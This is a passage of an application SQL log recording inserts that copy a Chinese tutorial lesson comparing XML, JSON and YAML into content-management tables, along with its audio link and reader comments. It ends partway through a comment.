</div> <div class="se-717847c7 " data-slate-type="paragraph" data-slate-object="block" data-key="2637"> 
<span data-slate-object="text" data-key="2638"><span data-slate-leaf="true" data-offset-key="2638:0" 
data-first-offset="true"><span class="se-3f105e0f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">YAML 由于极强的可读性，它在数据类型的明确性上做了一定程度的牺牲。</span></span></span></span><span 
data-slate-object="text" data-key="2639"><span data-slate-leaf="true" data-offset-key="2639:0" 
data-first-offset="true"><span data-slate-string="true">从上面的例子你可以发现，本来我们希望 name 是字符串，id 是数值，可是 
YAML 它根本不关心这一点，如你所见，字符串也没有双引号修饰，它只是诚实地把具体的文本数值罗列展示出来罢了。这一点，在我们权衡不同的数据交换格式的时候（比如设计哪一种格式作为我们的模块配置项文件），需要注意。</span></span></span> 
</div> <h2 class="se-a9871e2d" data-slate-type="heading" data-slate-object="block" data-key="2640"><span 
data-slate-object="text" data-key="2641"><span data-slate-leaf="true" data-offset-key="2641:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-f7ed2e71 " data-slate-type="paragraph" data-slate-object="block" data-key="2642"> 
<span data-slate-object="text" data-key="2643"><span data-slate-leaf="true" data-offset-key="2643:0" 
data-first-offset="true"><span data-slate-string="true">今天我们一边动手比较、一边学习了 XML 和 JSON 的前前后后，包括它们的风格、schema 
和路径表达式等等，并在之后了解了可读性至上的另一种数据交换语言 YAML。希望这些内容能够帮助你对于这些数据交换语言有更为全面的认识，并能够在工作中选择合适的技术来解决实际问题。</span></span></span> 
</div> <div class="se-0bea36b2 " data-slate-type="paragraph" data-slate-object="block" data-key="2644"> 
<span data-slate-object="text" data-key="2645"><span data-slate-leaf="true" data-offset-key="2645:0" 
data-first-offset="true"><span data-slate-string="true">今天的提问环节，我想换个形式。这一讲我们已经比较了许多 XML 和 JSON 
的特性了，其中一些涉及到了它们之间的优劣。那么，你能不能归纳出 XML 和 JSON 各自的一些优劣来呢？比如有这样几个方面供你参考，当然，你完全可以谈其它方面：</span></span></span> 
</div> <div class="se-dcf81a53" data-slate-type="list" data-slate-object="block" data-key="2646"> 
<div class="se-4a910080 se-97645ca6" data-slate-type="list-line" data-slate-object="block" 
data-key="2647"> <span data-slate-object="text" data-key="2648"><span data-slate-leaf="true" 
data-offset-key="2648:0" data-first-offset="true"><span data-slate-string="true">报文大小；</span></span></span> 
</div> <div class="se-ab852612 se-c35aa9e5" data-slate-type="list-line" data-slate-object="block" 
data-key="2649"> <span data-slate-object="text" data-key="2650"><span data-slate-leaf="true" 
data-offset-key="2650:0" data-first-offset="true"><span data-slate-string="true">数据类型的表达能力；</span></span></span> 
</div> <div class="se-c718b77a se-cd5b53ae" data-slate-type="list-line" data-slate-object="block" 
data-key="2651"> <span data-slate-object="text" data-key="2652"><span data-slate-leaf="true" 
data-offset-key="2652:0" data-first-offset="true"><span data-slate-string="true">Schema 的支持；</span></span></span> 
</div> <div class="se-321ba477 se-e1d307bb" data-slate-type="list-line" data-slate-object="block" 
data-key="2653"> <span data-slate-object="text" data-key="2654"><span data-slate-leaf="true" 
data-offset-key="2654:0" data-first-offset="true"><span data-slate-string="true">可读性；</span></span></span> 
</div> <div class="se-de4a142e se-1b29e67f" data-slate-type="list-line" data-slate-object="block" 
data-key="2655"> <span data-slate-object="text" data-key="2656"><span data-slate-leaf="true" 
data-offset-key="2656:0" data-first-offset="true"><span data-slate-string="true">数据校验的支持性；</span></span></span> 
</div> <div class="se-ca5f8105 se-a12d1e13" data-slate-type="list-line" data-slate-object="block" 
data-key="2657"> <span data-slate-object="text" data-key="2658"><span data-slate-leaf="true" 
data-offset-key="2658:0" data-first-offset="true"><span data-slate-string="true">序列化和反序列化（编程访问）的难易程度；</span></span></span> 
</div> <div class="se-46559b54 se-dc3091a1" data-slate-type="list-line" data-slate-object="block" 
data-key="2659"> <span data-slate-object="text" data-key="2660"><span data-slate-leaf="true" 
data-offset-key="2660:0" data-first-offset="true"><span data-slate-string="true">程序处理的性能；</span></span></span> 
</div> <div class="se-17a7f1b4 se-7531e02f" data-slate-type="list-line" data-slate-object="block" 
data-key="2661"> <span data-slate-object="text" data-key="2662"><span data-slate-leaf="true" 
data-offset-key="2662:0" data-first-offset="true"><span data-slate-string="true">Web 中的普适性；</span></span></span> 
</div> <div class="se-6fb78c27 se-731b37cb" data-slate-type="list-line" data-slate-object="block" 
data-key="2663"> <span data-slate-object="text" data-key="2664"><span data-slate-leaf="true" 
data-offset-key="2664:0" data-first-offset="true"><span data-slate-string="true">可扩展性（自定义 DSL 
的能力）；</span></span></span> </div> <div class="se-dbb82d7c se-137c2263" data-slate-type="list-line" 
data-slate-object="block" data-key="2665"> <span data-slate-object="text" data-key="2666"><span 
data-slate-leaf="true" data-offset-key="2666:0" data-first-offset="true"><span data-slate-string="true">……</span></span></span> 
</div> </div> <h2 class="se-3ee5bdd2" data-slate-type="heading" data-slate-object="block" data-key="2667"><span 
data-slate-object="text" data-key="2668"><span data-slate-leaf="true" data-offset-key="2668:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-b4b895d4" data-slate-type="list" data-slate-object="block" data-key="2669"> <div 
class="se-a42b9d88 se-38a63bce" data-slate-type="list-line" data-slate-object="block" data-key="2670"> 
<span data-slate-object="text" data-key="2671"><span data-slate-leaf="true" data-offset-key="2671:0" 
data-first-offset="true"><span data-slate-string="true">关于 DTD，你可以在</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2672" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2673"><span data-slate-leaf="true" data-offset-key="2673:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="2674"><span data-slate-leaf="true" data-offset-key="2674:0" data-first-offset="true"><span 
data-slate-string="true">找到许多例子；而 XSD，它的例子则在</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2675" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2676"><span data-slate-leaf="true" data-offset-key="2676:0" data-first-offset="true"><span 
data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" data-key="2677"><span 
data-slate-leaf="true" data-offset-key="2677:0" data-first-offset="true"><span data-slate-string="true">。而且，在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2678" class="se-e48fb8fa 
se-7e5be227"><span data-slate-object="text" data-key="2679"><span data-slate-leaf="true" data-offset-key="2679:0" 
data-first-offset="true"><span data-slate-string="true">XML Schema 与 XML DTD 的技术比较与分析</span></span></span></a><span 
data-slate-object="text" data-key="2680"><span data-slate-leaf="true" data-offset-key="2680:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章里，你可以得知为什么 W3C 最后选择了 XSD，而不是 DTD。另外，对于 
XSD 的批评，你可以参看</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2681" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2682"><span data-slate-leaf="true" 
data-offset-key="2682:0" data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span 
data-slate-object="text" data-key="2683"><span data-slate-leaf="true" data-offset-key="2683:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-c0030a1c se-f2d17da9" data-slate-type="list-line" data-slate-object="block" data-key="2684"> 
<span data-slate-object="text" data-key="2685"><span data-slate-leaf="true" data-offset-key="2685:0" 
data-first-offset="true"><span data-slate-string="true">对于 XPath，如果想全面地了解它的语法，请参阅 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2686" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2687"><span data-slate-leaf="true" data-offset-key="2687:0" 
data-first-offset="true"><span data-slate-string="true">XPath 词条</span></span></span></a><span 
data-slate-object="text" data-key="2688"><span data-slate-leaf="true" data-offset-key="2688:0" 
data-first-offset="true"><span data-slate-string="true">；如果你想检验所学，校验自己书写的 XPath 的正确性，那么你可以使用</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2689" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2690"><span data-slate-leaf="true" data-offset-key="2690:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2691"><span data-slate-leaf="true" data-offset-key="2691:0" 
data-first-offset="true"><span data-slate-string="true">，这个工具和文中介绍的 Xpath Generator 配合起来使用，可以非常有效地帮助你理解 
XPath。</span></span></span> </div> <div class="se-a97536e6 se-7148fcc4" data-slate-type="list-line" 
data-slate-object="block" data-key="2692"> <span data-slate-object="text" data-key="2693"><span 
data-slate-leaf="true" data-offset-key="2693:0" data-first-offset="true"><span data-slate-string="true">相应的，对于 
JSONPath，你可以阅读</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2694" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2695"><span data-slate-leaf="true" 
data-offset-key="2695:0" data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="2696"><span data-slate-leaf="true" data-offset-key="2696:0" 
data-first-offset="true"><span data-slate-string="true">来进一步了解它的语法，你也可以使用</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2697" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2698"><span data-slate-leaf="true" data-offset-key="2698:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2699"><span data-slate-leaf="true" data-offset-key="2699:0" 
data-first-offset="true"><span data-slate-string="true">来校验其正确性。</span></span></span> </div> 
<div class="se-6b01fe48 se-5e1a3c4a" data-slate-type="list-line" data-slate-object="block" 
data-key="2700"> <span data-slate-object="text" data-key="2701"><span data-slate-leaf="true" 
data-offset-key="2701:0" data-first-offset="true"><span data-slate-string="true">对于 YAML，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2702" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2703"><span data-slate-leaf="true" data-offset-key="2703:0" 
data-first-offset="true"><span data-slate-string="true">这个词条</span></span></span></a><span 
data-slate-object="text" data-key="2704"><span data-slate-leaf="true" data-offset-key="2704:0" 
data-first-offset="true"><span data-slate-string="true">来获得较为全面的了解；另外，你可能听说过 YAML 和 JSON 之间的超集与子集这样的关系，那我推荐你阅读 
YAML 官方文档的</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2705" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2706"><span data-slate-leaf="true" 
data-offset-key="2706:0" data-first-offset="true"><span data-slate-string="true">这一小段</span></span></span></a><span 
data-slate-object="text" data-key="2707"><span data-slate-leaf="true" data-offset-key="2707:0" 
data-first-offset="true"><span data-slate-string="true">关于它与 JSON 的区别和联系。</span></span></span> 
</div> <div class="se-2d0d6f51 se-5bb0a121" data-slate-type="list-line" data-slate-object="block" 
data-key="2708"> <span data-slate-object="text" data-key="2709"><span data-slate-leaf="true" 
data-offset-key="2709:0" data-first-offset="true"><span data-slate-string="true">文中介绍了数据交换语言这个大家族中的三个，其实还有其它成员，你可以阅读一</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2710" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2711"><span data-slate-leaf="true" data-offset-key="2711:0" 
data-first-offset="true"><span data-slate-string="true">下这个列表</span></span></span></a><span 
data-slate-object="text" data-key="2712"><span data-slate-leaf="true" data-offset-key="2712:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-dc77799b" data-slate-type="image" data-slate-object="block" data-key="2713"> 
<img class="se-9366ed47" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 6, 6) 
 {executed in 14 msec}
2020-11-19 11:02:01.034 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=6 
 {executed in 1 msec}
2020-11-19 11:02:01.034 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:02:01.035 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=6 
 {executed in 0 msec}
2020-11-19 11:02:01.036 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:02:01.037 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754921, 1605754921, 1, 'zh-hans', 0, 1, 1, 
0, '39丨XML、JSON、YAML比较', 1, 6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:01.049 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=6 
 {executed in 1 msec}
2020-11-19 11:02:01.049 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:02:01.050 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754921, 1605754921, 1, 'zh-hans', 0, 
1, 1, 0, '39丨XML、JSON、YAML比较', 'book', 1, 6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:01.057 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.058 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:01.061 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.062 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:01.063 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/5f6475ca74655d9914294316e95ea3d7?bkt=en-26dcfdb4e5ee1a49474cf30012d99d0d6f3c0db12ffb75e31c3f7d06fe1c024de71437d18497656d&fid=3757516097-778750-623367031039775&time=1605754919&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-62dXfFw8xKuLesSZRAUwHx455Xs%3D&to=92&size=10886194&sta_dx=10886194&sta_cs=2787&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885236&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=10886194&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-8e870f78077f17149bfaa4e81d862a342d7f1994802e27db884829b8744cb269a33ce3bbd4e8ab55&sl=76480590&expires=8h&rt=pr&r=993536132&mlogid=7501944020489226845&vbdid=2247232042&fin=39%E4%B8%A8XML%E3%80%81JSON%E3%80%81YAML%E6%AF%94%E8%BE%83.m4a&bflag=92,34-92&rtype=1&dp-logid=7501944020489226845&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=6271d6a92c89ad8b896d8f7d995d2b930e1bd5bfac32e1be&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=39%E4%B8%A8XML%E3%80%81JSON%E3%80%81YAML%E6%AF%94%E8%BE%83.m4a', 
6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:01.068 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.069 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:01.070 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/5f6475ca74655d9914294316e95ea3d7?bkt=en-26dcfdb4e5ee1a49474cf30012d99d0d6f3c0db12ffb75e31c3f7d06fe1c024de71437d18497656d&fid=3757516097-778750-623367031039775&time=1605754919&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-62dXfFw8xKuLesSZRAUwHx455Xs%3D&to=92&size=10886194&sta_dx=10886194&sta_cs=2787&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885236&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=10886194&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-8e870f78077f17149bfaa4e81d862a342d7f1994802e27db884829b8744cb269a33ce3bbd4e8ab55&sl=76480590&expires=8h&rt=pr&r=993536132&mlogid=7501944020489226845&vbdid=2247232042&fin=39%E4%B8%A8XML%E3%80%81JSON%E3%80%81YAML%E6%AF%94%E8%BE%83.m4a&bflag=92,34-92&rtype=1&dp-logid=7501944020489226845&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=6271d6a92c89ad8b896d8f7d995d2b930e1bd5bfac32e1be&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=39%E4%B8%A8XML%E3%80%81JSON%E3%80%81YAML%E6%AF%94%E8%BE%83.m4a', 
6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:01.077 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=6 
 {executed in 1 msec}
2020-11-19 11:02:01.077 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:01.078 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.079 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:01.080 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> JSON前段后台通讯用比较不错，看了一下文中关于JSON和YAML的比较，总体感觉就是YAML要求更高，不管是目的，YAML在保持可读性的同时还要支持连续的基本数据结构，像什么key的唯一性YAML是必须的，JSON就可以乱搞。 
<br>但是工作中，感觉YAML对手更应该是XML，还有一个“free style”选手，properties配置文件。 <br> </div> <div class="_2r3UB1GX_0"> 
<span>展开</span><i class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> 
<div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> 
<i class="iconfont"></i> <span class=""></span> </div> <!----> </div> </div> </div></li> <li 
class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/f8/99/8e760987.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>許敲敲</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> JSON的http报文大小更小，并且文件格式对于JS,Python来讲更容易操作，所以在web中更流行吧。 
</div> <!----> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 从操作系统方面而言其实代表了两类操作系统数据库：windows和linux;sql server2005开始就有不少数据用了xml格式，JSON的典型代表是mongodb。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xml的强结构化，可读性非常好；曾经主攻sql server时大量的开发直接生成xml，其文档的可读性和强结构化让代码做优化和修改时非常方便，当今主流的mybatis框架用的同样是xml格式。老师在说javascripe时其实漏了一个东西BSON，JSON同时代的产物，只是现在提及的人较少而已。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XML和JSON其实是两种类型的典型代表，各有千秋，合适的场景各取所长合理搭配才是最佳方案。 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍<br>BSON 是众多数据交换格式中的一种，现在使用并不多，而且是二进制的。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:01.087 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.088 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:01.092 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> JSON前段后台通讯用比较不错，看了一下文中关于JSON和YAML的比较，总体感觉就是YAML要求更高，不管是目的，YAML在保持可读性的同时还要支持连续的基本数据结构，像什么key的唯一性YAML是必须的，JSON就可以乱搞。 
<br>但是工作中，感觉YAML对手更应该是XML，还有一个“free style”选手，properties配置文件。 <br> </div> <div class="_2r3UB1GX_0"> 
<span>展开</span><i class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> 
<div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> 
<i class="iconfont"></i> <span class=""></span> </div> <!----> </div> </div> </div></li> <li 
class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/f8/99/8e760987.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>許敲敲</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> JSON的http报文大小更小，并且文件格式对于JS,Python来讲更容易操作，所以在web中更流行吧。 
